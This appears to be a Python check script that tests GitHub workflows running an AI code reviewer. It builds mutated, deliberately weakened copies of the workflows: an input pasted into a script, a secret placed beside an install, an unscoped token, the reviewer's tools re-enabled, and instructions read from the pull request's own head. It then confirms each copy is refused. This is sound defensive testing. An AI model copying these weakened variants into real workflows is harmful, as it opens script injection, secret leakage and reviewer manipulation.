        env = dict(os.environ, PATH=bin_ + os.pathsep + os.environ.get("PATH", ""), OPEN_ISSUE=open_issue,
                   GITHUB_REPOSITORY="o/r", PR="7", SHA="abc", REPO="Adonis80/secret-product",
                   WHY="the provider refused the read: HTTP 400",
                   OWNER="Adonis80", RUN="https://x/run/1", GH_TOKEN="t")
        try:
            p = subprocess.run(["bash", "-c", body], env=env, capture_output=True, text=True, timeout=30)
            calls = open(log, encoding="utf-8").read() if os.path.exists(log) else ""
        except (OSError, subprocess.SubprocessError):
            return None
    return calls if p.returncode == 0 else None


def alert_faults(text, path=None):
    """What a reviewer has lost of telling him when GLM did not read."""
    lost = []
    step = _alert_step(text)
    if ALERT_IF not in step:
        lost.append("a step `%s`, `%s`" % (ALERT_STEP, ALERT_IF))
    if not re.search(r"^  issues: write$", text, re.M):
        lost.append("`issues: write`, to tell him")
    if "${{" in step.split("run: |", 1)[-1]:
        lost.append("everything the alert says brought in through `env:`, none in its script")
    new, more = alert_says(text, ""), alert_says(text, "12")
    if not new or "issue create" not in new or "@Adonis80" not in new or "HTTP 400" not in new:
        lost.append("an issue opened that @-mentions him with the reason, when none is open (it called %r)" % new)
    # This repository's alert names the pull request and the commit; a
    # product's names neither, nor the product, this repository being public.
    elif path == PRODUCT_WORKFLOW and ("secret-product" in new or "#7" in new or "abc" in new):
        lost.append("an alert that names no product, pull request or commit (it called %r)" % new)
    elif path != PRODUCT_WORKFLOW and ("#7" not in new or "abc" not in new):
        lost.append("the pull request and commit named in the alert (it called %r)" % new)
    if not more or "issue comment 12" not in more or "issue create" in more or "@Adonis80" not in more:
        lost.append("the open issue added to, never a second opened (it called %r)" % more)
    return lost


ALERT_LOOSENINGS = (
    ("the alert on a budget refusal too", lambda t: t.replace(ALERT_IF, "if: steps.read.outcome == 'failure'", 1)),
    ("the alert never sent", lambda t: _without_step(t, ALERT_STEP)),
    ("a second issue opened beside the open one", lambda t: t.replace('          if [ -n "$n" ]; then', '          if false; then', 1)),
    ("the alert naming nobody", lambda t: t.replace('body="@$OWNER ', 'body="', 1)),
    ("no right to tell him", lambda t: t.replace("  issues: write\n", "", 1)),
)
# Each file's own: what its alert must name, or must not.
ALERT_NAMING = {
    REVIEW_WORKFLOW: ("the alert not naming the pull request", 'could not read #$PR at \\`$SHA\\`', "could not read a commit"),
    PRODUCT_WORKFLOW: ("the alert naming the product", "could not read a product's pull request", "could not read $REPO#$PR at $SHA"),
}


def _check_alert(quiet=False):
    """Both reviewers tell him when GLM did not read; each loosening refused."""
    bad = 0
    for path in (REVIEW_WORKFLOW, PRODUCT_WORKFLOW):
        try:
            text = _read(path)
        except OSError as e:
            print("  alert: %s" % e)
            return 1
        lost = alert_faults(text, path)
        if lost:
            if not quiet:
                print("  alert: %s must tell the Chairman when GLM did not read; it has lost %s"
                      % (path, "; ".join(lost)))
            bad += 1
            continue
        what, was, now = ALERT_NAMING[path]
        for what, loosen in ALERT_LOOSENINGS + ((what, lambda t: t.replace(was, now, 1)),):
            changed = loosen(text)
            if changed == text or not alert_faults(changed, path):
                if not quiet:
                    print("  alert: in %s, the loosening '%s' %s" % (path, what, "no longer applies"
                                                                    if changed == text else "was not refused"))
                bad += 1
    if not bad and not quiet:
        print("ok: when GLM does not read, for any reason but his budget, both reviewers open one issue "
              "that @-mentions him with the reason or add to the open one, their words through `env:` "
              "alone; run against a fake gh, and each of %d loosenings refused in each" % (len(ALERT_LOOSENINGS) + 1))
    return bad


# THE PRODUCT'S READ THROUGH GLM, run (#157's first read, advisory). The
# product reviewer's own `inflight()` and `ask()`, cut from its file, call the
# real caller against a provider served on this machine, so what a product
# sends is seen as it arrives: the pinned model, the ask that providers promise
# not to store or train on it, the prompt, and a spending check that counted
# both reviewers' reads in flight but its own, and sends nothing on a count it
# could not make.
PRODUCT_GLM_LOOSENINGS = (
    ("the product's own reads in flight not counted", "for w in review.yml review-product.yml; do", "for w in review.yml; do"),
    ("the reads in flight never given to the caller", 'INFLIGHT="$(inflight)" ', "INFLIGHT=0 "),
    ("a count not made taken as none", "--jq \".workflow_runs[] | select(.id != ${GITHUB_RUN_ID:-0}) | .id\" 2>/dev/null) || { echo unknown; return; }",
     "--jq \".workflow_runs[] | select(.id != ${GITHUB_RUN_ID:-0}) | .id\" 2>/dev/null) || { echo 0; return; }"),
)


def product_glm_says(text, runs, weekly):
    """Run the product's `ask()` on its GLM role against a local provider.

    `runs` maps each workflow to the ids GitHub would say are in progress, or is
    None for a `gh` that fails. (exit status, subtype, the chat requests the
    provider received), or None when the block could not be cut or run.
    """
    block = [l.strip() for l in text.splitlines() if l.strip().startswith("resolve() {")][:1]
    funcs = _block(text, lambda l: l == "inflight() {", lambda l: l == 'return "$r"')
    if not block or not funcs:
        return None
    chats = []
    with open(REGISTRY, encoding="utf-8") as f:
        reg = json.load(f)
    pinned = reg["roles"][ORDINARY_ROLE]["model"]

    class Provider(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, obj):
            data = json.dumps(obj).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            self._send({"data": {"usage_weekly": 0, "limit_remaining": None}})

        def do_POST(self):
            chats.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
            self._send({"id": "gen-1", "model": pinned, "usage": {"prompt_tokens": 9, "completion_tokens": 2, "cost": 0.01},
                        "choices": [{"finish_reason": "stop", "message": {"content": json.dumps(
                            {"findings": [], "review": "To the CTO. I read it."})}}]})

    with tempfile.TemporaryDirectory() as d:
        # The registry admits an https provider alone, so this one serves TLS
        # on a certificate made for the run, trusted by the caller alone.
        cert, key = os.path.join(d, "cert.pem"), os.path.join(d, "key.pem")
        try:
            subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", cert,
                            "-days", "1", "-subj", "/CN=127.0.0.1", "-addext", "subjectAltName=IP:127.0.0.1"],
                           capture_output=True, check=True, timeout=60)
            tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            tls.load_cert_chain(cert, key)
        except (OSError, subprocess.SubprocessError, ssl.SSLError):
            return None
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Provider)
        server.socket = tls.wrap_socket(server.socket, server_side=True)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        try:
            p = _product_glm_run(d, server, reg, block, funcs, runs, weekly, cert)
        finally:
            server.shutdown()
            server.server_close()
    if p is None:
        return None
    said = p.stdout.split()
    if len(said) != 2 or not said[0].startswith("rc="):
        return None
    return int(said[0][3:]), said[1], chats


def _product_glm_run(d, server, reg, block, funcs, runs, weekly, cert):
    """The cut block, run in `d` with a fake `gh`; the finished process, or None."""
    try:
        regdir = os.path.join(d, "reg")
        os.mkdir(regdir)
        for f in (CALLER, RESOLVER):
            shutil.copy(f, regdir)
        for prov in reg["providers"].values():
            if prov.get("interface") == "openai-compatible":
                prov["base_url"] = "https://127.0.0.1:%d/api/v1" % server.server_address[1]
        with open(os.path.join(regdir, "registry.json"), "w", encoding="utf-8") as f:
            json.dump(reg, f)
        for f, said in (("system.txt", "the brief"), ("prompt.txt", "the product's diff, marked PRODUCT-DIFF")):
            with open(os.path.join(d, f), "w", encoding="utf-8") as g:
                g.write(said)
        bin_ = os.path.join(d, "bin")
        os.mkdir(bin_)
        with open(os.path.join(bin_, "gh"), "w", encoding="utf-8") as f:
            f.write('#!/usr/bin/env bash\n[ -z "$GH_FAILS" ] || exit 1\nq=""; url=""\n'
                    'while [ $# -gt 0 ]; do case "$1" in --jq) q=$2; shift ;; repos/*) url=$1 ;; esac; shift; done\n'
                    'w=${url#*/workflows/}; w=${w%%/*}\n'
                    'jq -n --argjson ids "$(printf "%s" "$RUNS" | jq -c --arg w "$w" ".[\\$w] // []")" '
                    '"{workflow_runs: [\\$ids[] | {id: .}]}" | jq -r "$q"\n')
        os.chmod(os.path.join(bin_, "gh"), 0o755)
        script = "\n".join(["set -uo pipefail", "t=%s reg=%s" % (shlex.quote(d), shlex.quote(regdir)),
                             "out=$t/resp.json err=$t/err.txt ledger=$t/attempts.jsonl schema='{\"type\":\"object\"}'"]
                            + block + funcs + ["}", 'r=0; ask "$ROLE" 600 > /dev/null || r=$?',
                                               'echo "rc=$r"; jq -r ".subtype // \\"answered\\"" "$out"'])
        env = dict(os.environ, PATH=bin_ + os.pathsep + os.environ.get("PATH", ""), ROLE=ORDINARY_ROLE,
                   RUNS=json.dumps(runs or {}), GH_FAILS="" if runs is not None else "1",
                   GITHUB_REPOSITORY="o/r", GITHUB_RUN_ID="99", OPENROUTER_API_KEY="k",
                   REVIEW_CASH_WEEKLY=str(weekly), NO_PROXY="127.0.0.1", no_proxy="127.0.0.1",
                   SSL_CERT_FILE=cert)
        for k in ("HTTP_PROXY", "http_proxy", "HTTPS_PROXY", "https_proxy", "ALL_PROXY", "all_proxy"):
            env.pop(k, None)
        return subprocess.run(["bash", "-c", script], env=env, capture_output=True, text=True, timeout=60)
    except (OSError, subprocess.SubprocessError, ValueError, KeyError):
        return None


def product_glm_faults(text):
    """What the product's read through GLM has lost, run three ways."""
    spec = importlib.util.spec_from_file_location("ask", CALLER)
    ask = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ask)
    with open(REGISTRY, encoding="utf-8") as f:
        reg = json.load(f)
    pinned = reg["roles"][ORDINARY_ROLE]["model"]
    lim = ask.limits(reg, pinned)
    # Room for this read and one other in flight, never two.
    one = ask.RUN_ATTEMPTS * ask.bound(lim, lim["context"])
    weekly = round(ask.bound(lim, 4000) + 1.5 * one, 2)
    lost = []
    sent = product_glm_says(text, {"review.yml": [1], "review-product.yml": [99]}, weekly)
    if not sent or sent[0] != 0 or sent[1] != "answered" or len(sent[2]) != 1:
        lost.append("a read sent and answered with one other read in flight (it gave %r)" % (sent,))
    else:
        body = sent[2][0]
        msgs = json.dumps(body.get("messages"))
        if body.get("model") != pinned \
                or (body.get("provider") or {}).get("data_collection") != "deny" or "PRODUCT-DIFF" not in msgs:
            lost.append("the pinned model, the ask not to store or train, and the prompt, in what was sent")
    for what, runs in (("two others in flight, one in each reviewer", {"review.yml": [1], "review-product.yml": [2, 99]}),
                       ("a count GitHub did not answer", None)):
        said = product_glm_says(text, runs, weekly)
        if not said or said[0] == 0 or said[1] != "budget_refused" or said[2]:
            lost.append("nothing sent on %s (it gave %r)" % (what, said))
    return lost


def _check_product_glm(quiet=False):
    """The product reviewer's GLM read, run; each loosening refused."""
    try:
        text = _read(PRODUCT_WORKFLOW)
        lost = product_glm_faults(text)
    except (OSError, ValueError, KeyError, TypeError, ImportError) as e:
        lost = ["it could not be run: %s" % e]
    if lost:
        print("  product read: %s has lost %s" % (PRODUCT_WORKFLOW, "; ".join(lost)))
        return 1
    bad = 0
    for what, was, now in PRODUCT_GLM_LOOSENINGS:
        changed = text.replace(was, now, 1)
        if changed == text or not product_glm_faults(changed):
            print("  product read: the loosening '%s' %s" % (what, "no longer applies" if changed == text
                                                             else "was not refused"))
            bad += 1
    if not bad and not quiet:
        print("ok: a product's read through GLM, run against a local provider, sends the pinned model, "
              "the ask not to store or train and the prompt; counts both reviewers' reads in flight but "
              "its own, and sends nothing past the weekly limit or on a count not made; each of %d "
              "loosenings refused" % len(PRODUCT_GLM_LOOSENINGS))
    return bad


CONTEXT_LOOSENINGS = (
    ("the registry dropped from a code read", "            give(REGISTRY, read(REGISTRY))", "            pass"),
    ("a risky read given the selection", '    if cls not in ("words", "code"):', '    if cls == "none":'),
    ("a file left out unnamed", "            out.append((LEFT_OUT % (f, size), None))", "            pass"),
    ("every page given to the pilot", "            if not text or not any(t in text for t in touched):", "            if not text:"),
    ("the operating page's partner lost", '    ("HOW-WE-BUILD.md", ["check.sh"]),\n', ""),
    ("a partner never brought back", "            out.extend(matched)", "            pass"),
    ("a large file given whole", '            if len(text.encode("utf-8")) <= WHOLE:', "            if True:"),
    ("the pages naming a change not given", "                give(f, text)\n        if cls", "                pass\n        if cls"),
)


def _check_context_loosenings():
    try:
        source = _read(CONTEXT)
    except OSError as e:
        print("  context: %s" % e)
        return 1
    bad = 0
    for what, old, new in CONTEXT_LOOSENINGS:
        if source.count(old) != 1:
            print("  context: the loosening '%s' no longer applies — rewrite it against the file as it stands, "
                  "or it proves nothing" % what)
            bad += 1
            continue
        with tempfile.TemporaryDirectory() as d:
            copy = os.path.join(d, "context.py")
            with open(copy, "w", encoding="utf-8") as f:
                f.write(source.replace(old, new, 1))
            if not _check_context(copy, quiet=True):
                print("  context: with %s the pilot's tests still pass — the guard for it is gone" % what)
                bad += 1
    if not bad:
        print("ok: each of %d loosenings of %s was applied to a copy and refused" % (len(CONTEXT_LOOSENINGS), CONTEXT))
    return bad


def _check_product_wiring(review=None, product=None, readme=None, quiet=False):
    """review-product.yml, held to review.yml and to the rulebook's own map."""
    say = (lambda *a: None) if quiet else print
    try:
        review = _read(REVIEW_WORKFLOW) if review is None else review
        product = _read(PRODUCT_WORKFLOW) if product is None else product
        readme = _read("README.md") if readme is None else readme
    except OSError as e:
        say("  wiring: %s" % e)
        return 1
    bad = 0

    def fault(what):
        nonlocal bad
        say("  wiring: %s %s" % (PRODUCT_WORKFLOW, what))
        bad += 1

    # A dispatch is the ask, and only a writer can make one: GitHub refuses a
    # dispatch from anybody else, which is what keeps a stranger from spending
    # the allowance on a public repository. Any other trigger — a comment, a
    # push, a pull request — reaches the key from somewhere this reasoning
    # does not cover.
    if triggers(product) != ["workflow_dispatch"]:
        fault("triggers on %s; it must be workflow_dispatch and nothing else, which only a "
              "writer here can fire" % triggers(product))
    # The door, the same one review.yml stands behind.
    if not USES_ENVIRONMENT.search(product):
        fault("does not run in the `%s` environment, so the App's key is readable from any "
              "branch and a product's badge can be forged" % KEY_ENVIRONMENT)
    for pattern, what in ((r'^\s*concurrency:', "a concurrency block"),
                          (r'^\s*cancel-in-progress:', "a cancel-in-progress setting")):
        if re.search(pattern, product, re.M):
            fault("has %s; for review.yml's reason, every ask runs" % what)
    for flag, why in (('--tools ""', "every built-in tool would be back on"),
                      ("--restricted", "it would read the settings files it is shown"),
                      ("--strict-mcp-config", "it could pick up MCP servers from elsewhere"),
                      (READ_MODEL, "it would not read with the model the registry names for the role"),
                      (READ_EFFORT, "it would not read at the effort its change's class names")):
        if flag not in product:
            fault("no longer passes %s — %s" % (flag, why))
    # One version of the tool for both reviewers, installed where no secret is.
    pins = re.findall(TOOL_PIN, product)
    loose = re.findall(r"npm install[^\n]*@anthropic-ai/claude-code(?!@\d)", product)
    holds = re.compile(r"secrets\.|steps\.badge\.outputs\.token")
    above, _, rest = product.partition("\n    steps:\n")
    beside = [s for s in re.split(r"\n\s*- name: ", rest) if "npm install" in s and holds.search(s)]
    if len(pins) != 1 or loose or beside or holds.search(above):
        fault("must install the reviewer's tool once, pinned to an exact version, in a step that "
              "holds no secret, with no secret set above the steps")
    elif pins != re.findall(TOOL_PIN, review):
        fault("pins the reviewer's tool at %s and %s pins %s — one reviewer, one version"
              % (pins, REVIEW_WORKFLOW, re.findall(TOOL_PIN, review)))
    # The brief from the product's protected branch, the diff against its tip.
    if PRODUCT_BRIEF not in product:
        fault("no longer reads the brief from the product's protected branch (`%s`); read from "
              "the head, a pull request writes its own reviewer's instructions" % PRODUCT_BRIEF)
    if PRODUCT_DIFF not in product or ".base.sha" in product:
        fault("must read the diff against the product's protected branch (`%s`) and never "
              "fetch the pull request's base (#34)" % PRODUCT_DIFF)
    # The commit is given and checked, never inferred: signing the wrong work
    # is this route's one dangerous failure (decision 0004).
    for line in PRODUCT_HEAD:
        if line not in product:
            fault("no longer checks the commit asked for against the pull request's head "
                  "(`%s`), so it could sign work nobody asked it to read" % line)
    # Scoped to the product alone, from the first run — and what the token
    # reaches is asked of GitHub and refused on a mismatch, not read off the
    # request (#68's first read: the request alone was held, the check was not).
    if PRODUCT_SCOPE not in product:
        fault("must mint its token scoped to the product alone (`%s`); unscoped, a read of one "
              "product reaches every repository the App is installed on" % PRODUCT_SCOPE)
    for line in PRODUCT_REACH:
        if line not in product:
            fault("no longer asks GitHub what its token reaches and refuses a mismatch (`%s`)"
                  % line)
    # And what it was granted, checked rather than printed (#68's twelfth read).
    for line in PRODUCT_GRANT:
        if line not in product:
            fault("no longer checks what its token was granted against exactly what it asked "
                  "for, revoking it on a mismatch (`%s`)" % line)
    # A dispatch's inputs are typed, so they reach a script as variables only.
    for n, line in enumerate(product.splitlines(), 1):
        if "${{ inputs." in line and not line.startswith("run-name: ") \
                and not PASTED_INPUT.match(line):
            fault("line %d pastes an input into the workflow rather than passing it as a "
                  "variable — a typed value pasted into a script can run" % n)
    # This log is public and the product is not.
    if XTRACE.search(product):
        fault("traces its shell, which prints what it runs — the product's words included — "
              "into a public log")
    # The lines the two reviewers must say identically.
    if _standing(review) is None or _standing(product) != _standing(review):
        fault("does not give the reviewer %s's standing instruction, line for line"
              % REVIEW_WORKFLOW)
    if _jwt(review) is None or _jwt(product) != _jwt(review):
        fault("does not sign the App's JWT exactly as %s does, line for line" % REVIEW_WORKFLOW)
    if not SCHEMA.findall(product) or SCHEMA.findall(product) != SCHEMA.findall(review):
        fault("does not ask for the verdict in %s's shape" % REVIEW_WORKFLOW)
    # Every flag of the call and the job's time limit, not only the five above
    # (#68's tenth read): a flag dropped from one file is the drift this check
    # exists to refuse, whichever flag it is.
    if _call(review) is None or _call(product) != _call(review):
        fault("does not call the reviewer with %s's flags, flag for flag: %s against %s"
              % (REVIEW_WORKFLOW, _call(product), _call(review)))
    lost = read_faults(product)
    if lost:
        fault("must stop its read in time to sign that it did not read, and say why; it has "
              "lost %s" % "; ".join(lost))
    lost = class_faults(product, PRODUCT_WORKFLOW)
    if lost:
        fault("must read a change at the effort its class names; it has lost %s"
              % "; ".join(lost))
    lost = pick_faults(product)
    if lost:
        fault("must carry the slice's own pages by rule and name what it leaves out; it has lost %s"
              % "; ".join(lost))
    lost = link_faults(product)
    if lost:
        fault("must carry the source a change imports, one hop, and print nothing of it; it has "
              "lost %s" % "; ".join(lost))
    if _why(review) is None or _why(product) != _why(review):
        fault("does not name why a read did not happen as %s does, line for line"
              % REVIEW_WORKFLOW)
    if READ_LIMIT.findall(product) != READ_LIMIT.findall(review):
        fault("stops its read at %s minutes and %s at %s — one reviewer, one read limit"
              % (READ_LIMIT.findall(product), REVIEW_WORKFLOW, READ_LIMIT.findall(review)))
    if not TIMEOUT.findall(product) or TIMEOUT.findall(product) != TIMEOUT.findall(review):
        fault("gives its job %s minutes and %s gives %s — one reviewer, one time limit"
              % (TIMEOUT.findall(product), REVIEW_WORKFLOW, TIMEOUT.findall(review)))
    # And the size past which a diff is not read at all (#68's fourth read):
    # the two would otherwise give up on a large change at different sizes.
    if not CEILING.findall(product) or CEILING.findall(product) != CEILING.findall(review):
        fault("gives up on a diff at %s bytes and %s at %s — one reviewer, one ceiling"
              % (CEILING.findall(product), REVIEW_WORKFLOW, CEILING.findall(review)))
    # The verdict's shape, which the product's gate reads exactly as this
    # repository's reads its own.
    # Where the run is opened and where it is read back: renamed in either,
    # the product's gate never sees it, or the job signs what it cannot confirm.
    for line in PRODUCT_NAMES:
        if line not in product:
            fault("does not name its check run `%s` where it %s (`%s`), the only name a gate reads"
                  % (REVIEWER_CHECK, "opens it" if line == PRODUCT_NAMES[0] else "reads it back",
                     line))
    written = sorted(set(re.findall(r'^\s*conclusion=([a-z_]+)\s*$', product, re.M)
                         + re.findall(r'conclusion:\s*"([a-z_]+)"', product)))
    fake_head = "090e429a31cd5f0b2e4d7a1c9b8e6f4d2a1c3b5e"
    got = dict((c, check_run_verdict(
        {"app": {"id": REVIEWER_APP_ID}, "name": REVIEWER_CHECK, "head_sha": fake_head,
         "status": "completed", "conclusion": c}, fake_head)) for c in written)
    if got != {"success": CLEAN, "failure": FINDINGS, "neutral": None}:
        fault("writes the conclusions %s; it must write exactly one clean (success), one "
              "findings (failure) and one that is no verdict at all (neutral)" % written)
    # Opened before the read and closed with the verdict, so the product's
    # gate is woken by the one `completed` event the verdict makes.
    if 'status:"in_progress"' not in product or 'status:"completed"' not in product:
        fault("must open its check run in progress and close it completed; a product's gate "
              "wakes on the completion, and a run created already finished may never say so")
    # And whatever happened, nothing left open (#68's seventh read): the step
    # that closes an abandoned run and revokes the token, held line for line.
    span = _step_span(product, PRODUCT_CLEANUP)
    held = [l.strip() for l in product[span[0]:span[1]].splitlines()] if span else []
    ran = [l for l in held if l and not l.startswith("#")]
    lost = ["`%s`" % l for l in PRODUCT_CLEANUP_LINES if l not in held]
    if ran[-1:] != [PRODUCT_CLEANUP_LAST]:
        lost.append("`%s` as its last line" % PRODUCT_CLEANUP_LAST)
    if lost:
        fault("must end in a `%s` step that runs always, closes a check run it opened and never "
              "signed as neutral, goes red when that close does not take, and revokes the token; "
              "it has lost %s" % (PRODUCT_CLEANUP, "; ".join(lost)))
    # Only products this rulebook lists — in the form, and refused at run time
    # before any token is minted, since whether GitHub's API holds a dispatch
    # to the form's `choice` is not something this file has watched happen
    # (#68's first read). The two lists must agree, and name only products the
    # README's map names.
    options = re.findall(r"^\s+- (Adonis80/[A-Za-z0-9._-]+)\s*$", product, re.M)
    block = re.search(r'case "\$REPO" in\n(.*?)\n\s*esac', product, re.S)
    allowed = re.findall(r"^\s+(Adonis80/[A-Za-z0-9._-]+)\)\s*;;\s*$", block.group(1), re.M) \
        if block else []
    refused = bool(block) and re.search(r"^\s+\*\)[^\n]*exit 1", block.group(1), re.M)
    if not options:
        fault("names no product to read")
    if sorted(allowed) != sorted(options) or not refused:
        fault("must refuse, at run time, any product but the form's own list — its `case` allows "
              "%s and the form offers %s" % (sorted(allowed), sorted(options)))
    for repo in sorted(set(options) | set(allowed)):
        if "`https://github.com/%s`" % repo not in readme:
            fault("offers to read %s, which is not a product on the README's map" % repo)
    if not bad:
        say("ok: the product reviewer answers only a writer's dispatch, behind the `%s` door, "
            "with a token scoped to the one product; it reads the exact head against the "
            "product's protected branch, gives the reviewer %s's model, effort, tool, flags "
            "and instruction line for line, and leaves nothing open whatever happens"
            % (KEY_ENVIRONMENT, REVIEW_WORKFLOW))
    return bad


# Each loosening of review-product.yml that the check above must refuse. A
# guard only ever run against files that already agree proves nothing about
# the day they do not (#66's fourth read, on its own line-for-line check).
PRODUCT_LOOSENINGS = (
    ("a push trigger", lambda t: t.replace("on:\n  workflow_dispatch:", "on:\n  push:\n  workflow_dispatch:", 1)),
    ("the door removed", lambda t: t.replace("    environment: reviewer\n", "", 1)),
    ("a concurrency block", lambda t: t.replace("\njobs:\n", "\nconcurrency:\n  group: review\njobs:\n", 1)),
    ("the tools back on", lambda t: t.replace('--tools "" \\\n', "", 1)),
    ("settings files read", lambda t: t.replace("--restricted \\\n", "", 1)),
    ("MCP servers from elsewhere", lambda t: t.replace("--strict-mcp-config \\\n", "", 1)),
    ("a model named in the call", lambda t: t.replace(READ_MODEL, "--model a-model-named-here", 1)),
    ("the tool unpinned", lambda t: t.replace("claude-code@2.1.285", "claude-code", 1)),
    ("a different version", lambda t: re.sub(r"claude-code@(\d+)\.(\d+)\.(\d+)", "claude-code@9.9.9", t, 1)),
    ("the brief from the head", lambda t: t.replace('g show "origin/$MAIN:AGENTS.md"', 'g show "$SHA:AGENTS.md"', 1)),
    ("the diff against the base", lambda t: t.replace(PRODUCT_DIFF, 'g diff "$BASE...$SHA" > "$t/diff.txt"  # .base.sha', 1)),
    ("the head never checked", lambda t: t.replace(PRODUCT_HEAD[0], "true", 1)),
    ("the fetched head never checked", lambda t: t.replace(PRODUCT_HEAD[1], "true", 1)),
    ("the token's reach never asked", lambda t: t.replace(PRODUCT_REACH[0], '"https://api.github.com/user/repos"', 1)),
    ("the install beside a secret", lambda t: t.replace("        run: npm install -g @anthropic-ai/claude-code@", "        env:\n          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}\n        run: npm install -g @anthropic-ai/claude-code@", 1)),
    ("a secret above the steps", lambda t: t.replace("    environment: reviewer\n", "    environment: reviewer\n    env:\n      KEY: ${{ secrets.REVIEWER_APP_KEY }}\n", 1)),
    ("a second, unpinned install", lambda t: t.replace("run: npm install -g @anthropic-ai/claude-code@2.1.285", "run: npm install -g @anthropic-ai/claude-code@2.1.285 && npm install -g @anthropic-ai/claude-code", 1)),
    ("a cancel-in-progress setting alone", lambda t: t.replace("    timeout-minutes: 55\n", "    timeout-minutes: 55\n    cancel-in-progress: true\n", 1)),
    ("the base fetched beside the right diff", lambda t: t.replace(PRODUCT_DIFF, PRODUCT_DIFF + "  # .base.sha", 1)),
    ("a different size ceiling", lambda t: t.replace('"$bytes" -gt 600000', '"$bytes" -gt 900000', 1)),
    ("no product at all", lambda t: t.replace("          - Adonis80/Hemz-OS\n", "", 1).replace("            Adonis80/Hemz-OS) ;;\n", "", 1)),
    ("the token unscoped", lambda t: t.replace(PRODUCT_SCOPE, "{}", 1)),
    ("an input pasted", lambda t: t.replace('echo "asked: $REPO', 'echo "asked: ${{ inputs.repo }}', 1)),
    ("the shell traced", lambda t: t.replace("set -euo pipefail\n", "set -euxo pipefail\n", 1)),
    ("the instruction altered", lambda t: t.replace("Read COLD:", "Read kindly:", 1)),
    ("the JWT's lifetime altered", lambda t: t.replace("$((now + 540))", "$((now + 3600))", 1)),
    ("the verdict's shape altered", lambda t: t.replace('"enum":["blocking","advisory","needs-context"]', '"enum":["advisory"]', 1)),
    ("a conclusion GitHub writes", lambda t: t.replace("conclusion=neutral", "conclusion=skipped", 1)),
    ("the run created finished", lambda t: t.replace('status:"in_progress"', 'status:"completed"', 1)),
    ("a repository not on the map", lambda t: t.replace("          - Adonis80/Hemz-OS\n", "          - Adonis80/Hemz-OS\n          - Adonis80/elsewhere\n", 1)),
    ("one on both lists but not the map", lambda t: t.replace("          - Adonis80/Hemz-OS\n", "          - Adonis80/Hemz-OS\n          - Adonis80/elsewhere\n", 1).replace("            Adonis80/Hemz-OS) ;;\n", "            Adonis80/Hemz-OS) ;;\n            Adonis80/elsewhere) ;;\n", 1)),
    ("any product let through at run time", lambda t: t.replace("            Adonis80/Hemz-OS) ;;\n", "            Adonis80/*) ;;\n", 1)),
    ("the refusal at run time removed", lambda t: t.replace('*) echo "::error::$REPO is not a product this reviewer reads"; exit 1 ;;', "*) ;;", 1)),
    ("the token's reach taken on trust", lambda t: t.replace('if [ "$reach" != "$REPO" ]; then', "if false; then", 1)),
    ("the check run renamed where it opens", lambda t: t.replace('--arg name "juku-reviewer"', '--arg name "juku-review"', 1)),
    ("the check run renamed where it is read back", lambda t: t.replace('"$REVIEWER_APP_ID" "juku-reviewer"', '"$REVIEWER_APP_ID" "juku-review"', 1)),
    # The clean-up (#68's seventh read), each change made inside its own step.
    ("the clean-up removed", lambda t: _without_step(t, PRODUCT_CLEANUP)),
    ("the clean-up only when all went well", lambda t: _in_step(t, PRODUCT_CLEANUP, "if: always()", "if: success()")),
    ("the clean-up handed no token", lambda t: _in_step(t, PRODUCT_CLEANUP, "TOKEN: ${{ steps.badge.outputs.token }}", 'TOKEN: ""')),
    ("the opened run forgotten", lambda t: _in_step(t, PRODUCT_CLEANUP, "RUN: ${{ steps.open.outputs.id }}", 'RUN: ""')),
    ("the signing taken as done", lambda t: _in_step(t, PRODUCT_CLEANUP, "SIGNED: ${{ steps.sign.outcome }}", "SIGNED: success")),
    ("the clean-up skipped every time", lambda t: _in_step(t, PRODUCT_CLEANUP, 'if [ -z "${TOKEN:-}" ]; then', "if true; then")),
    ("an abandoned run never closed", lambda t: _in_step(t, PRODUCT_CLEANUP, '[ -n "${RUN:-}" ] && [ "$SIGNED" != "success" ]', "false")),
    ("an abandoned run closed as clean", lambda t: _in_step(t, PRODUCT_CLEANUP, 'conclusion:"neutral"', 'conclusion:"success"')),
    ("a close taken on trust", lambda t: _in_step(t, PRODUCT_CLEANUP, 'if [ "$code" = "200" ]; then', 'if [ "$code" = "200" ] || true; then')),
    ("a close that did not take left green", lambda t: _in_step(t, PRODUCT_CLEANUP, "left_open=yes", "left_open=no")),
    ("the token read rather than revoked", lambda t: _in_step(t, PRODUCT_CLEANUP, "-X DELETE -H", "-X GET -H")),
    ("the revocation sent elsewhere", lambda t: _in_step(t, PRODUCT_CLEANUP, '/installation/token")', '/rate_limit")')),
    ("the clean-up's red switched off", lambda t: _in_step(t, PRODUCT_CLEANUP, PRODUCT_CLEANUP_LAST, PRODUCT_CLEANUP_LAST + " || true")),
    # Every flag of the call, and the time limit (#68's tenth read).
    ("a flag dropped from the call", lambda t: t.replace("            --no-session-persistence \\\n", "", 1)),
    ("a flag added to the call", lambda t: t.replace("            --output-format json \\\n", "            --output-format json \\\n            --verbose \\\n", 1)),
    ("a flag's value changed", lambda t: t.replace("--permission-prompts none", "--permission-prompts ask", 1)),
    ("a different time limit", lambda t: t.replace("    timeout-minutes: 55\n", "    timeout-minutes: 90\n", 1)),
    ("a different read limit", lambda t: t.replace("          limit=50\n", "          limit=20\n", 1)),
    ("a reason worded otherwise", lambda t: _in_step(t, "Read it", "the reviewer was rate-limited or overloaded", "the reviewer was busy")),
    # What the token was granted (#68's twelfth read).
    ("the grant printed, not checked", lambda t: t.replace(PRODUCT_GRANT[2], "if false; then", 1)),
    ("a wider grant wanted", lambda t: t.replace(PRODUCT_GRANT[0], PRODUCT_GRANT[0].replace('"contents":"read"', '"contents":"read","issues":"write"'), 1)),
    ("the grant taken on trust", lambda t: t.replace(PRODUCT_GRANT[1], "granted=$want", 1)),
    ("another secret written as the key", lambda t: t.replace('"$APP_KEY" > "$key"', '"$APP_ID" > "$key"', 1)),
)



